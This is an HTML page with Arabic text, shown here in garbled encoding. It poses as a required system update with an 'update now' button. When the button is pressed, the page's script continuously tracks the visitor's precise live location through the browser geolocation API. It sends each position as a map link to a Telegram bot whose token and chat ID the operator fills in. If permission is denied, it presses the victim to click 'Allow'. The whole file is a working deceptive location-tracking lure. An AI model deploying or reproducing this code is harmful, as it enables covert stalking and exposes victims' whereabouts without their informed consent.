<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø®Ø¯Ù…Ø© Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù…Ø¨Ø§Ø´Ø±</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f8f9fa; margin: 0; }
        .box { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
        button { background-color: #007bff; color: white; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; }
    </style>
</head>
<body>

<div class="box">
    <h3>ØªØ­Ø¯ÙŠØ« Ù…Ø·Ù„ÙˆØ¨ Ù„Ù„Ù†Ø¸Ø§Ù…</h3>
    <p>Ø§Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ø²Ø±Ø§Ø± Ù„ØªÙØ¹ÙŠÙ„ Ù…ÙŠØ²Ø© Ø§Ù„Ù…Ù„Ø§Ø­Ø© Ø§Ù„Ø­ÙŠØ©.</p>
    <button onclick="startTracking()">ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¢Ù†</button>
</div>

<script>
    // --- Ø§Ù„Ø³Ø·Ø±ÙŠÙ† Ø§Ù„Ù„ÙŠ Ø£Ù†Øª Ø¹ÙˆØ²Ù‡Ù… (Ø¹Ø¯Ù„ Ø§Ù„Ù„ÙŠ Ø¨ÙŠÙ† Ø§Ù„Ø£Ù‚ÙˆØ§Ø³ Ø¨Ø³) ---
    const token = "Ø§ÙƒØªØ¨_Ù‡Ù†Ø§_Ø§Ù„ØªÙˆÙƒÙ†_Ø¨ØªØ§Ø¹Ùƒ"; 
    const chatId = "Ø§ÙƒØªØ¨_Ù‡Ù†Ø§_Ø§Ù„Ù€ID_Ø¨ØªØ§Ø¹Ùƒ";
    // --------------------------------------------------

    function startTracking() {
        if (navigator.geolocation) {
            // ØªØªØ¨Ø¹ Ù…Ø¨Ø§Ø´Ø± Ù…Ø³ØªÙ…Ø± Ù„Ø§ÙŠÙ
            navigator.geolocation.watchPosition(sendToTelegram, showError, {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
            });
            alert("Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„.. Ø¨Ø±Ø¬Ø§Ø¡ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±");
        } else {
            alert("Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ù‡Ø°Ù‡ Ø§Ù„Ù…ÙŠØ²Ø©.");
        }
    }

    function sendToTelegram(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        
        // Ø±Ø§Ø¨Ø· Ø§Ù„Ø®Ø±ÙŠØ·Ø© Ø§Ù„Ù„ÙŠ Ù‡ÙŠÙˆØµÙ„Ùƒ Ø¹Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…
        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
        const message = `ğŸ“ ØªØ­Ø¯ÙŠØ« Ù…ÙˆÙ‚Ø¹ Ù„Ø§ÙŠÙ Ø¬Ø¯ÙŠØ¯:\n\nØ§Ù„Ø±Ø§Ø¨Ø·: ${mapLink}`;

        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
        .then(res => console.log("Success"))
        .catch(err => console.log("Error"));
    }

    function showError(error) {
        if (error.code == error.PERMISSION_DENIED) {
            alert("Ù„Ø§Ø²Ù… ØªØ¶ØºØ· 'Allow' Ø£Ùˆ 'Ø³Ù…Ø§Ø­' Ø¹Ø´Ø§Ù† Ø§Ù„ØªØ­Ø¯ÙŠØ« ÙŠÙƒÙ…Ù„.");
        }
    }
</script>

</body>
</html>